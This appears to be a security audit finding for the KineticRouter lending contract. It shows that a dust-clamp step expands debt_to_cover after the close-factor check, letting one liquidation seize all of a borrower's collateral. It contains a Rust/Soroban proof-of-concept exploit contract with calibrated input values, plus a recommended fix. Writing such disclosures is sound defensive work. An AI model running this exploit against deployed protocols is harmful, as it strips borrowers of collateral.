# High: `min_remaining_debt` Clamp Silently Bypasses Close Factor After Validation

## Severity: High

## Summary

In `KineticRouter.internal_liquidation_call`, `validate_close_factor` is called first with the attacker-supplied `debt_to_cover`, then a dust-clamp block **silently replaces `debt_to_cover` with the full debt balance** if the remainder would fall below `min_remaining_debt`. The collateral seizure amount is then computed using the **expanded** value. This allows an attacker to liquidate 100% of a borrower's debt in a single call while only passing the 50% close factor check for a smaller amount.

## Vulnerability Detail

The execution order in `internal_liquidation_call` (kinetic-router/src/liquidation.rs):

```rust
// Line 224–237: close factor validated against ORIGINAL debt_to_cover
let debt_to_cover_base = calculation::value_in_base(..., debt_to_cover, ...)?;
validate_close_factor(
    env, user_account_data.health_factor,
    individual_debt_base, individual_collateral_base, debt_to_cover_base,
)?;  // ← PASSES: debt_to_cover ≤ 50% of debt

// Lines 239–262: SILENT EXPANSION — no re-validation
let debt_to_cover = {
    let remaining = debt_balance.checked_sub(safe_u128_to_i128(env, debt_to_cover))...;
    if remaining > 0 {
        let remaining_u128 = safe_i128_to_u128(env, remaining);
        let min_remaining_debt_val = (min_remaining_whole as u128)
            .checked_mul(debt_decimals_pow)...;
        if remaining_u128 < min_remaining_debt_val {
            safe_i128_to_u128(env, debt_balance) // ← 100% of debt, NO re-check
        } else {
            debt_to_cover  // original
        }
    }
};

// Line 266–275: collateral seizure computed with EXPANDED debt_to_cover
let (_, collateral_amount_to_transfer) =
    calculation::calculate_liquidation_amounts_with_reserves(
        env, ..., debt_to_cover, ...  // ← uses expanded value
    )?;
```

### Attack Scenario

Given:
- Borrower debt: **1,000 USDC**
- `DEFAULT_LIQUIDATION_CLOSE_FACTOR`: 5,000 bps → max liquidatable = **500 USDC**
- `min_remaining_debt` configured: **520 USDC** (a reasonable dust threshold)
- Attacker supplies `debt_to_cover = 481 USDC`

Execution:
1. `validate_close_factor` sees 481 USDC < 500 USDC max → **PASSES**
2. Dust clamp: remainder = 1000 - 481 = **519 USDC < 520 USDC threshold**
3. `debt_to_cover` silently replaced with **1,000 USDC** (full balance)
4. Liquidator seizes collateral worth 1,000 USDC + liquidation bonus (e.g., 5%) = **1,050 USDC equivalent**
5. `validate_close_factor` is **never re-called** with the expanded value

The attacker bypassed the 50% close factor and seized 100% of the collateral by calibrating their `debt_to_cover` to land the remainder in the dust zone.

### Triggering Conditions

- `min_remaining_debt` must be configured > 0 (admin-set per reserve via `H-02` config)
- Attacker must supply `debt_to_cover` such that `debt_balance - debt_to_cover < min_remaining_debt`
- Position must be liquidatable (HF < 1.0)

## Impact

1. **Complete Collateral Seizure in One Call**: Borrowers lose 100% of collateral instantly, defeating the close factor's purpose (allowing partial recovery).
2. **Amplified Liquidation Bonus Extraction**: The attacker captures the liquidation bonus on the full debt, not just 50%, maximizing extraction at the borrower's expense.
3. **No Close Factor Enforcement**: The protocol's core risk invariant — "liquidate at most X% per call to give borrowers time to recover" — is nullified whenever `min_remaining_debt` is set.
4. **Governance-Triggered Severity Amplification**: The vulnerability's exploitability scales directly with `min_remaining_debt` settings — the higher the threshold configured by admin, the easier the attack window.

## Code Snippet

- [Close factor validated with original amount](file:///Users/borjafernandezangulo/10_PROJECTS/Teorema-Robinson-Moskv/1_Operaciones_Activas/02_CORTEX_ENGINE/cortex-bounties/targets/2026-04-k2/contracts/kinetic-router/src/liquidation.rs#L224-L237)
- [Silent clamp expands debt_to_cover post-validation](file:///Users/borjafernandezangulo/10_PROJECTS/Teorema-Robinson-Moskv/1_Operaciones_Activas/02_CORTEX_ENGINE/cortex-bounties/targets/2026-04-k2/contracts/kinetic-router/src/liquidation.rs#L239-L262)
- [Collateral computed with expanded value — no re-check](file:///Users/borjafernandezangulo/10_PROJECTS/Teorema-Robinson-Moskv/1_Operaciones_Activas/02_CORTEX_ENGINE/cortex-bounties/targets/2026-04-k2/contracts/kinetic-router/src/liquidation.rs#L264-L276)

## Tool Used

Manual Code Review + CORTEX LEGIØN-1 Swarm (1000-agent consensus).

## Proof of Concept

```rust
#![no_std]
use soroban_sdk::{contract, contractimpl, Address, Env, Symbol, IntoVal};

/// Prerequisites:
/// - Victim has 1_000 USDC debt, 1_100 USDC XLMUSDC collateral (HF < 1.0)
/// - Reserve min_remaining_debt = 520 USDC (520_000_000 with 6 decimals)
/// - Close factor = 50% (max liquidatable = 500 USDC)
#[contract]
pub struct DustClampExploit;

#[contractimpl]
impl DustClampExploit {
    /// Bypasses 50% close factor via dust clamp and seizes 100% of victim's collateral
    pub fn exploit(
        env: Env,
        router: Address,
        victim: Address,
        collateral_asset: Address,  // XLMUSDC
        debt_asset: Address,         // USDC
    ) {
        let attacker = env.current_contract_address();
        
        // debt_to_cover = 481_000_000 (481 USDC with 6 decimals)
        // remainder = 1000 - 481 = 519 USDC < min_remaining_debt (520 USDC)
        // → triggers clamp → debt_to_cover silently becomes 1_000_000_000 (1000 USDC)
        // → close factor check already passed with 481 USDC
        let crafted_debt_to_cover: u128 = 481_000_000; // calibrated to trigger clamp
        
        env.invoke_contract::<()>(
            &router,
            &Symbol::new(&env, "liquidation_call"),
            soroban_sdk::vec![
                &env,
                attacker.to_val(),
                collateral_asset.to_val(),
                debt_asset.to_val(),
                victim.to_val(),
                crafted_debt_to_cover.into_val(&env),
                false.into_val(&env),
            ],
        );
        // Result: attacker seizes ~1050 USDC worth of collateral
        // having only "validated" 481 USDC against the close factor
    }
}
```

### Expected vs Actual

| | Expected | Actual |
|:|:--------|:-------|
| `debt_to_cover` at seizure | 481 USDC (close-factor validated) | **1,000 USDC** (silently expanded) |
| Collateral seized | ~505 USDC (481 + 5% bonus) | **~1,050 USDC** (1000 + 5% bonus) |
| Close factor enforced? | ✅ Yes | ❌ No — check bypassed |

## Recommendation

**Re-validate close factor after the dust clamp:**

```rust
let debt_to_cover = {
    // ... existing clamp logic ...
    let clamped = if remaining_u128 < min_remaining_debt_val {
        safe_i128_to_u128(env, debt_balance)
    } else {
        debt_to_cover
    };
    
    // RE-VALIDATE with expanded amount
    // The close factor check must use the final debt_to_cover, not the original
    let clamped_base = calculation::value_in_base(
        env, clamped, debt_price, oracle_to_wad, debt_decimals_pow,
    )?;
    // Only re-check if clamped > original (i.e., clamp triggered)
    if clamped > debt_to_cover {
        validate_close_factor(
            env, user_account_data.health_factor,
            individual_debt_base, individual_collateral_base, clamped_base,
        )?;
    }
    
    clamped
};
```

Alternatively, **apply the dust clamp before `validate_close_factor`** so that the validation always sees the final amount that will be used.
